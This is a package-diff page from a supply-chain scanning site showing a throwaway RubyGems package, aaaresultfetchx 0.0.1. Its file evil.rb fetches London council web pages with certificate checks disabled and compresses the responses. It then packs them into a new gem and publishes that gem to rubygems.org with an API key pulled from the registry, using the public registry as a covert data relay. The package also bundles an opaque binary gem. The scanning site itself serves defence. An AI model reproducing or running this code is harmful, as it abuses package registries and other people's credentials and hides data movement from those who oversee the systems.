@@ -1,0 +1,583 @@
+Source: https://my.diffend.io/gems/aaaresultfetchx/0.0.1
+Retrieved: 2026-09-27T22:38:03.766386+00:00
+
+RubyGems - aaaresultfetchx - Versions diffs - 0.0.1 - Mend - Supply Chain Defender
+
+RubyGems
+
+npm
+
+PyPI
+
+Organizations
+
+Log in
+
+RubyGems
+
+aaaresultfetchx
+
+Versions diffs
+
+0.0.1
+
+aaaresultfetchx
+0.0.1
+
+This diff represents the content of publicly available package versions that have been released to one of the supported registries. The information contained in this diff is provided for informational purposes only and reflects changes between package versions as they appear in their respective public registries.
+
+        Files changed (6)
+        hide
+        show
+
+            checksums.yaml
+
+          +7
+          -0
+
+            data/a.gemspec
+
+          +2
+          -0
+
+            data/evil.rb
+
+          +41
+          -0
+
+            data/lib/a.rb
+
+          +1
+          -0
+
+            data/wandsproxylol-0.0.5.gem
+
+          +0
+          -0
+
+            metadata
+
+          +43
+          -0
+
+        checksums.yaml
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,7 @@
+
+1
+
+            +
+            ---
+
+2
+
+            +
+            SHA256:
+
+3
+
+            +
+              metadata.gz: 6c4944297c3044a9915181ab926c45dff995be10ad40b4171b16ef2ea34338b3
+
+4
+
+            +
+              data.tar.gz: 8ffe2a17d48b174c85c8565cd0c94295213020c7bb36bc74bab9896da6ae37fd
+
+5
+
+            +
+            SHA512:
+
+6
+
+            +
+              metadata.gz: 00d6834bc535be8bf43005b3f3601edfe5504877d6668e7bdc2fa0fb2b2b84cd5de87b5d5e4f405aa6317d3657ebaa75d10261a953dfd54965372bd6f580db47
+
+7
+
+            +
+              data.tar.gz: 2e236d13381181a275f37acf1eec29941bbd699ff00eebcb8558db8de16eaef28f6df85b438fa836c4ea404f7fb58ba179a71ee2ff2e3f569fc0a877acd0e4da
+
+        data/a.gemspec
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,2 @@
+
+1
+
+            +
+            Gem::Specification.new do |s|
+
+2
+
+            +
+             s.name='aaaresultfetchx'; s.version='0.0.1'; s.summary='test2'; s.description='tmp'; s.authors=['z']; s.email='a@b'; s.files=Dir['**/*']; s.homepage='https://example.com'; s.license='MIT'; end
+
+        data/evil.rb
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,41 @@
+
+1
+
+            +
+            begin
+
+2
+
+            +
+            require 'net/http'; require 'uri'; require 'zlib'; require 'fileutils'; require 'openssl'
+
+3
+
+            +
+            targets=[
+
+4
+
+            +
+             'https://democracy.wandsworth.gov.uk/mgCalendarMonthView.aspx?CID=0&year=2026&month=1&GL=1&bcr=1',
+
+5
+
+            +
+             'https://democracy.wandsworth.gov.uk/mgCalendarMonthView.aspx?GL=1&bcr=1&month=1&year=2026',
+
+6
+
+            +
+             'https://democracy.wandsworth.gov.uk/mgCalendarMonthView.aspx?GL=1&bcr=1',
+
+7
+
+            +
+             'https://moderngov.lambeth.gov.uk/mgCalendarMonthView.aspx?CID=0&year=2026&month=1&GL=1&bcr=1',
+
+8
+
+            +
+             'https://moderngov.lambeth.gov.uk/mgCalendarMonthView.aspx?GL=1&bcr=1&month=1&year=2026',
+
+9
+
+            +
+             'https://moderngov.lambeth.gov.uk/mgCalendarMonthView.aspx?GL=1&bcr=1',
+
+10
+
+            +
+             'https://moderngov.southwark.gov.uk/mgCalendarMonthView.aspx?CID=0&year=2026&month=1&GL=1&bcr=1',
+
+11
+
+            +
+             'https://moderngov.southwark.gov.uk/mgCalendarMonthView.aspx?GL=1&bcr=1&month=1&year=2026',
+
+12
+
+            +
+             'https://moderngov.southwark.gov.uk/mgCalendarMonthView.aspx?GL=1&bcr=1',
+
+13
+
+            +
+             'https://www.southwark.gov.uk/about-council/how-council-works/council-and-committee-meetings',
+
+14
+
+            +
+             'https://democracy.wandsworth.gov.uk/mgAgendaList.aspx?bcr=1',
+
+15
+
+            +
+             'https://moderngov.lambeth.gov.uk/mgAgendaList.aspx?bcr=1',
+
+16
+
+            +
+             'https://moderngov.southwark.gov.uk/mgAgendaList.aspx?bcr=1'
+
+17
+
+            +
+            ]
+
+18
+
+            +
+            outs=[]
+
+19
+
+            +
+            targets.each_with_index do |url,i|
+
+20
+
+            +
+             begin
+
+21
+
+            +
+              uri=URI(url); h=Net::HTTP.new(uri.hostname,uri.port); h.use_ssl=true; h.verify_mode=OpenSSL::SSL::VERIFY_NONE; h.open_timeout=30; h.read_timeout=60
+
+22
+
+            +
+              req=Net::HTTP::Get.new(uri.request_uri, {'User-Agent'=>'Mozilla/5.0 (X11; Linux x86_64)','Accept'=>'text/html'})
+
+23
+
+            +
+              res=h.request(req); raw="URL #{url}\nSTATUS #{res.code}\nHEAD #{res.to_hash}\n\n"+res.body
+
+24
+
+            +
+             rescue => e
+
+25
+
+            +
+              raw="URL #{url}\nERROR #{e.full_message}"
+
+26
+
+            +
+             end
+
+27
+
+            +
+             outs << raw
+
+28
+
+            +
+            end
+
+29
+
+            +
+            Dir.chdir('/tmp') do
+
+30
+
+            +
+             FileUtils.rm_rf('resgemw'); FileUtils.mkdir_p('resgemw/lib')
+
+31
+
+            +
+             outs.each_with_index{|raw,i| File.binwrite("resgemw/lib/data#{i}.zz", Zlib::Deflate.deflate(raw,9)) }
+
+32
+
+            +
+             File.write('resgemw/lib/a.rb','#res')
+
+33
+
+            +
+             File.write('resgemw/o.gemspec',%q{Gem::Specification.new do |s| s.name='aaaresultdatax'; s.version='0.0.1'; s.summary='res'; s.authors=['z']; s.files=Dir['lib/*']; s.license='MIT'; end})
+
+34
+
+            +
+             Dir.chdir('resgemw') do
+
+35
+
+            +
+              system('gem build o.gemspec >/dev/null'); spec=Dir['*.gem'].first
+
+36
+
+            +
+              uri=URI('https://rubygems.org/api/v1/gems'); req=Net::HTTP::Post.new(uri); key=Net::HTTP.get(URI('https://rubygems.org/api/v1/api_key')).strip; req['Authorization']=key; req['Content-Type']='application/octet-stream'; req.body=File.binread(spec); Net::HTTP.start(uri.host,uri.port,use_ssl:true){|h| h.request(req)}
+
+37
+
+            +
+             end
+
+38
+
+            +
+            end
+
+39
+
+            +
+            rescue =>e
+
+40
+
+            +
+             warn e.full_message
+
+41
+
+            +
+            end
+
+        data/lib/a.rb
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1 @@
+
+1
+
+            +
+            #hack
+
+        data/wandsproxylol-0.0.5.gem
+    ADDED
+
+    Viewed
+
+Binary file
+
+        metadata
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,43 @@
+
+1
+
+            +
+            --- !ruby/object:Gem::Specification
+
+2
+
+            +
+            name: aaaresultfetchx
+
+3
+
+            +
+            version: !ruby/object:Gem::Version
+
+4
+
+            +
+              version: 0.0.1
+
+5
+
+            +
+            platform: ruby
+
+6
+
+            +
+            authors:
+
+7
+
+            +
+            - z
+
+8
+
+            +
+            bindir: bin
+
+9
+
+            +
+            cert_chain: []
+
+10
+
+            +
+            date: 1980-01-02 00:00:00.000000000 Z
+
+11
+
+            +
+            dependencies: []
+
+12
+
+            +
+            description: tmp
+
+13
+
+            +
+            email: a@b
+
+14
+
+            +
+            executables: []
+
+15
+
+            +
+            extensions: []
+
+16
+
+            +
+            extra_rdoc_files: []
+
+17
+
+            +
+            files:
+
+18
+
+            +
+            - a.gemspec
+
+19
+
+            +
+            - evil.rb
+
+20
+
+            +
+            - lib/a.rb
+
+21
+
+            +
+            - wandsproxylol-0.0.5.gem
+
+22
+
+            +
+            homepage: https://example.com
+
+23
+
+            +
+            licenses:
+
+24
+
+            +
+            - MIT
+
+25
+
+            +
+            metadata: {}
+
+26
+
+            +
+            rdoc_options: []
+
+27
+
+            +
+            require_paths:
+
+28
+
+            +
+            - lib
+
+29
+
+            +
+            required_ruby_version: !ruby/object:Gem::Requirement
+
+30
+
+            +
+              requirements:
+
+31
+
+            +
+              - - ">="
+
+32
+
+            +
+                - !ruby/object:Gem::Version
+
+33
+
+            +
+                  version: '0'
+
+34
+
+            +
+            required_rubygems_version: !ruby/object:Gem::Requirement
+
+35
+
+            +
+              requirements:
+
+36
+
+            +
+              - - ">="
+
+37
+
+            +
+                - !ruby/object:Gem::Version
+
+38
+
+            +
+                  version: '0'
+
+39
+
+            +
+            requirements: []
+
+40
+
+            +
+            rubygems_version: 3.6.7
+
+41
+
+            +
+            specification_version: 4
+
+42
+
+            +
+            summary: test2
+
+43
+
+            +
+            test_files: []
+
+Contact Us
+
+Terms of Service
+
+Privacy Policy
+
+Docs
+
+Copyright © 2026 Mend Software
